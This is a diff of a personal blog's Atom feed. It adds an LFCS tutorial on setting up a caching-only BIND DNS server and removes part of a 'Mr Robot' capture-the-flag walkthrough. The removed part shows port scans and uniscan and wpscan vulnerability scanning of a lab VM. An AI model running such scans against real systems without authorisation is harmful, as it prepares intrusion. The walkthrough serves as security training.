@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-02-08T12:53:28-05:00</updated>
+  <updated>2018-02-10T14:12:32-05:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,166 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[LFCS prep - Configure caching-only DNS]]></title>
+    <link href="http://chousensha.github.io/blog/2018/02/10/lfcs-prep-configure-caching-only-dns/"/>
+    <updated>2018-02-10T14:04:48-05:00</updated>
+    <id>http://chousensha.github.io/blog/2018/02/10/lfcs-prep-configure-caching-only-dns</id>
+    <content type="html"><![CDATA[<p>Today we&rsquo;ll take a look at setting up a caching only DNS server for the LFCS exam objectives.</p>
+
+<!-- more -->
+
+
+<p>First, install the necessary DNS packages: <code>yum install -y bind bind-utils</code>.</p>
+
+<p>Then you will have to do some editing in <code>/etc/named.conf</code>. In particular, you are interested in the below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>listen-on port 53 { 127.0.0.1; any; };
+</span><span class='line'>allow-query     { localhost; any; };
+</span><span class='line'>allow-query-cache     { localhost; any; };</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <em>allow-query</em> option deals with who can send queries to the server, while the <em>allow-query-cache</em> allows access to cached records</p>
+
+<p>You have to ensure the named.conf file has the proper permissions. It needs to be owned by root and belong to the group named:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /etc/named.conf
+</span><span class='line'>-rw-r-----. 1 root named 1754 Feb 10 19:46 /etc/named.conf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Check the SELinux contexts:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lZ /etc/named.*
+</span><span class='line'>-rw-r-----. root named unconfined_u:object_r:etc_t:s0   /etc/named.conf
+</span><span class='line'>-rw-r--r--. root named system_u:object_r:etc_t:s0       /etc/named.iscdlv.key
+</span><span class='line'>-rw-r-----. root named system_u:object_r:named_conf_t:s0 /etc/named.rfc1912.zones
+</span><span class='line'>-rw-r--r--. root named system_u:object_r:etc_t:s0       /etc/named.root.key</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Check the config file for syntax errors before trying anything:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>named-checkconf /etc/named.conf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Start the DNS service:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start named</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Open port 53 on the firewall:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --add-port=53/udp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On the client, add the DNS server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con mod ens33 ipv4.dns "192.168.217.131"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Restart the connection and NetworkManager. Check that the nameserver has been added in <code>/etc/resolv.conf</code>. Now you can test it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nslookup github.com
+</span><span class='line'>Server:       192.168.217.131
+</span><span class='line'>Address:  192.168.217.131#53
+</span><span class='line'>
+</span><span class='line'>Non-authoritative answer:
+</span><span class='line'>Name: github.com
+</span><span class='line'>Address: 192.30.253.113
+</span><span class='line'>Name: github.com
+</span><span class='line'>Address: 192.30.253.112</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you need to add a zone to your DNS server, take a look at the sample zone directives in <em>/etc/named.rfc1912.zones</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>zone "localhost.localdomain" IN {
+</span><span class='line'>  type master;
+</span><span class='line'>  file "named.localhost";
+</span><span class='line'>  allow-update { none; };
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You have to add a similar configuration for your zone inside <code>/etc/named.conf</code>. Then you also have to create a zone file inside <strong>/var/named</strong>. For reference, look at an existing one:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat /var/named/named.localhost 
+</span><span class='line'>$TTL 1D
+</span><span class='line'>@ IN SOA  @ rname.invalid. (
+</span><span class='line'>                  0   ; serial
+</span><span class='line'>                  1D  ; refresh
+</span><span class='line'>                  1H  ; retry
+</span><span class='line'>                  1W  ; expire
+</span><span class='line'>                  3H )    ; minimum
+</span><span class='line'>  NS  @
+</span><span class='line'>  A   127.0.0.1
+</span><span class='line'>  AAAA    ::1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This should be all that is needed in terms of DNS configuration for LFCS objectives.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
+</span><span class='line'>/ This life is yours. Some of it was \
+</span><span class='line'>| given to you; the rest, you made   |
+</span><span class='line'>\ yourself.                          /
+</span><span class='line'> ------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[LFCS prep - Runlevels and bootloader configuration]]></title>
@@ -9360,861 +9520,6 @@ Google API key and CSE ID in the plugin (discovery/googleCSE.py)</p>
 </span><span class='line'>|                                         |
 </span><span class='line'>\ -- Mark Twain                           /
 </span><span class='line'> -----------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Owning Mr Robot]]></title>
-    <link href="http://chousensha.github.io/blog/2017/07/01/owning-mr-robot/"/>
-    <updated>2017-07-01T04:46:24-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/07/01/owning-mr-robot</id>
-    <content type="html"><![CDATA[<p>Today&rsquo;s target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.</p>
-
-<!-- more -->
-
-
-<p>I used Masscan to grab the open ports, which I then passed to Nmap:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>masscan -p1-65535 --banners 192.168.217.145 --rate=10000
-</span><span class='line'>
-</span><span class='line'>Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-07-01 08:49:44 GMT
-</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span><span class='line'>Initiating SYN Stealth Scan
-</span><span class='line'>Scanning 1 hosts [65535 ports/host]
-</span><span class='line'>Discovered open port 443/tcp on 192.168.217.145                                
-</span><span class='line'>Discovered open port 80/tcp on 192.168.217.145     
-</span><span class='line'>
-</span><span class='line'>nmap -T4 -p80,443 -A 192.168.217.145
-</span><span class='line'>PORT    STATE SERVICE  VERSION
-</span><span class='line'>80/tcp  open  http     Apache httpd
-</span><span class='line'>|_http-server-header: Apache
-</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
-</span><span class='line'>443/tcp open  ssl/http Apache httpd
-</span><span class='line'>|_http-server-header: Apache
-</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
-</span><span class='line'>| ssl-cert: Subject: commonName=www.example.com
-</span><span class='line'>| Not valid before: 2015-09-16T10:45:03
-</span><span class='line'>|_Not valid after:  2025-09-13T10:45:03</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Just a web server. However, this doesn&rsquo;t look like your regular web app:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/fsociety.png" title="fsociety" alt="fsociety login"></p>
-
-<p>Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here&rsquo;s what we have so far:</p>
-
-<ul>
-<li><p>prepare &ndash; a video that ends with an address that warrants checking: whoismrrobot.com</p></li>
-<li><p>fsociety &ndash; a CLI animation that asks if you are ready to join</p></li>
-<li><p>inform &ndash; a series of news that reveal the hypocrisy of today&rsquo;s (is it really made up?) society</p></li>
-</ul>
-
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/deflated.png" title="sports scandal" alt="sports scandal"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/space.png" title="space rocket" alt="space rocket"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/meast.png" title="middle east" alt="middle east"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/gala.png" title="gala" alt="celebrity gala"></p>
-
-<ul>
-<li>question &ndash; more pictures with hard to accept truths</li>
-</ul>
-
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/america.png" title="patriot" alt="american dream"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/executive.png" title="executive" alt="executive stealing"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/capitalist.png" title="capitalism" alt="capitalism"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/bzns.png" title="business" alt="business"></p>
-
-<ul>
-<li><p>wakeup &ndash; shows some high level executives arguing in a skyscraper</p></li>
-<li><p>join &ndash; fsociety requests your mail address to keep in touch</p></li>
-</ul>
-
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/mail.png" title="enter your mail" alt="enter your mail"></p>
-
-<p>Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/whois.png" title="whois mr robot" alt="whois mr robot"></p>
-
-<p>You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:</p>
-
-<ul>
-<li><p>fsociety_endgame &ndash; launches a game that you might want to discover for yourself</p></li>
-<li><p>massacre &ndash; launches a movie, but I got a message that content is not available to my location</p></li>
-<li><p>elliot &ndash; shows a GIF</p></li>
-<li><p>fivenine &ndash; looks like a collection of clips related to the Five-Nine attack</p></li>
-<li><p>restart &ndash; another scene from the series</p></li>
-<li><p>join &ndash; get in touch with Mr Robot</p></li>
-<li><p>archive &ndash; shows some of the above commands</p></li>
-</ul>
-
-
-<h2>Flag #1</h2>
-
-<p>When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn&rsquo;t the only robot around:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
-</span><span class='line'>fsocity.dic
-</span><span class='line'>key-1-of-3.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We&rsquo;ve found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code></p>
-
-<p>The other things looks like a dictionary file with various strings. Maybe it will come in handy later.</p>
-
-<p>Continuing the web recon, I decided to use a tool that I haven&rsquo;t used before: uniscan!</p>
-
-<h3>uniscan description</h3>
-
-<p>Homepage: <a href="https://sourceforge.net/projects/uniscan/">https://sourceforge.net/projects/uniscan/</a></p>
-
-<blockquote><p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p></blockquote>
-
-<p>This tool comes in both CLI and GUI form. The GUI interface is plain and simple:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/uniscan-gui.png" title="uniscan-gui" alt="uniscan gui"></p>
-
-<h3>uniscan options</h3>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>####################################
-</span><span class='line'># Uniscan project                  #
-</span><span class='line'># http://uniscan.sourceforge.net/  #
-</span><span class='line'>####################################
-</span><span class='line'>V. 6.3
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>OPTIONS:
-</span><span class='line'>  -h  help
-</span><span class='line'>  -u  &lt;url&gt; example: https://www.example.com/
-</span><span class='line'>  -f  &lt;file&gt; list of url's
-</span><span class='line'>  -b  Uniscan go to background
-</span><span class='line'>  -q  Enable Directory checks
-</span><span class='line'>  -w  Enable File checks
-</span><span class='line'>  -e  Enable robots.txt and sitemap.xml check
-</span><span class='line'>  -d  Enable Dynamic checks
-</span><span class='line'>  -s  Enable Static checks
-</span><span class='line'>  -r  Enable Stress checks
-</span><span class='line'>  -i  &lt;dork&gt; Bing search
-</span><span class='line'>  -o  &lt;dork&gt; Google search
-</span><span class='line'>  -g  Web fingerprint
-</span><span class='line'>  -j  Server fingerprint
-</span><span class='line'>
-</span><span class='line'>usage: 
-</span><span class='line'>[1] perl ./uniscan.pl -u http://www.example.com/ -qweds
-</span><span class='line'>[2] perl ./uniscan.pl -f sites.txt -bqweds
-</span><span class='line'>[3] perl ./uniscan.pl -i uniscan
-</span><span class='line'>[4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
-</span><span class='line'>[5] perl ./uniscan.pl -o "inurl:test"
-</span><span class='line'>[6] perl ./uniscan.pl -u https://www.example.com/ -r</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Crawler Started:
-</span><span class='line'>| Plugin name: FCKeditor upload test v.1 Loaded.
-</span><span class='line'>| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
-</span><span class='line'>| Plugin name: Upload Form Detect v.1.1 Loaded.
-</span><span class='line'>| Plugin name: phpinfo() Disclosure v.1 Loaded.
-</span><span class='line'>| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
-</span><span class='line'>| Plugin name: Code Disclosure v.1.1 Loaded.
-</span><span class='line'>| Plugin name: E-mail Detection v.1.1 Loaded.
-</span><span class='line'>| Plugin name: External Host Detect v.1.2 Loaded.
-</span><span class='line'>| [+] Crawling finished, 59 URL's found!
-</span><span class='line'>
-</span><span class='line'>Dynamic tests:
-</span><span class='line'>| Plugin name: Learning New Directories v.1.2 Loaded.
-</span><span class='line'>| Plugin name: FCKedior tests v.1.1 Loaded.
-</span><span class='line'>| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
-</span><span class='line'>| Plugin name: Find Backup Files v.1.2 Loaded.
-</span><span class='line'>| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
-</span><span class='line'>| Plugin name: Local File Include tests v.1.1 Loaded.
-</span><span class='line'>| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
-</span><span class='line'>| Plugin name: Remote Command Execution tests v.1.1 Loaded.
-</span><span class='line'>| Plugin name: Remote File Include tests v.1.2 Loaded.
-</span><span class='line'>| Plugin name: SQL-injection tests v.1.2 Loaded.
-</span><span class='line'>| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
-</span><span class='line'>| Plugin name: Web Shell Finder v.1.3 Loaded.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And the tool did find some useful information for further compromising the target!</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>===================================================================================================
-</span><span class='line'>|
-</span><span class='line'>| Directory check:
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/Image/
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/feed/
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/image/
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/login/
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/rss/
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/wp-login/
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/wp-admin/
-</span><span class='line'>===================================================================================================
-</span><span class='line'>|                                                                                                   
-</span><span class='line'>| File check:
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/index.html
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/index.php
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/favicon.ico
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.html
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.html%20
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.php
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/license.txt
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/readme.html
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/readme
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/robots.txt
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/htx/sqlqhit.asp
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/htx/SQLQHit.asp
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/sqlqhit.asp
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/SQLQHit.asp
-</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/sitemap.xml
-</span><span class='line'>===================================================================================================</span></code></pre></td></tr></table></div></figure>
-
-
-<p>What do you know, a Wordpress instance is running on the server! So it&rsquo;s time for wpscan!</p>
-
-<h3>wpscan description</h3>
-
-<p>Homepage: <a href="https://wpscan.org/">https://wpscan.org/</a></p>
-
-<blockquote><p>WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>
-
-<h3>wpscan options</h3>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-<span class='line-number'>115</span>
-<span class='line-number'>116</span>
-<span class='line-number'>117</span>
-<span class='line-number'>118</span>
-<span class='line-number'>119</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --help
-</span><span class='line'>_______________________________________________________________
-</span><span class='line'>        __          _______   _____                  
-</span><span class='line'>        \ \        / /  __ \ / ____|                 
-</span><span class='line'>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-</span><span class='line'>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
-</span><span class='line'>           \  /\  /  | |     ____) | (__| (_| | | | |
-</span><span class='line'>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-</span><span class='line'>
-</span><span class='line'>        WordPress Security Scanner by the WPScan Team 
-</span><span class='line'>                       Version 2.9.2
-</span><span class='line'>          Sponsored by Sucuri - https://sucuri.net
-</span><span class='line'>   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
-</span><span class='line'>_______________________________________________________________
-</span><span class='line'>
-</span><span class='line'>Help :
-</span><span class='line'>
-</span><span class='line'>Some values are settable in a config file, see the example.conf.json
-</span><span class='line'>
-</span><span class='line'>--update                            Update the database to the latest version.
-</span><span class='line'>--url       | -u &lt;target url&gt;       The WordPress URL/domain to scan.
-</span><span class='line'>--force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
-</span><span class='line'>--enumerate | -e [option(s)]        Enumeration.
-</span><span class='line'>  option :
-</span><span class='line'>    u        usernames from id 1 to 10
-</span><span class='line'>    u[10-20] usernames from id 10 to 20 (you must write [] chars)
-</span><span class='line'>    p        plugins
-</span><span class='line'>    vp       only vulnerable plugins
-</span><span class='line'>    ap       all plugins (can take a long time)
-</span><span class='line'>    tt       timthumbs
-</span><span class='line'>    t        themes
-</span><span class='line'>    vt       only vulnerable themes
-</span><span class='line'>    at       all themes (can take a long time)
-</span><span class='line'>  Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
-</span><span class='line'>  If no option is supplied, the default is "vt,tt,u,vp"
-</span><span class='line'>
-</span><span class='line'>--exclude-content-based "&lt;regexp or string&gt;"
-</span><span class='line'>                                    Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
-</span><span class='line'>                                    You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
-</span><span class='line'>--config-file  | -c &lt;config file&gt;   Use the specified config file, see the example.conf.json.
-</span><span class='line'>--user-agent   | -a &lt;User-Agent&gt;    Use the specified User-Agent.
-</span><span class='line'>--cookie &lt;string&gt;                   String to read cookies from.
-</span><span class='line'>--random-agent | -r                 Use a random User-Agent.
-</span><span class='line'>--follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
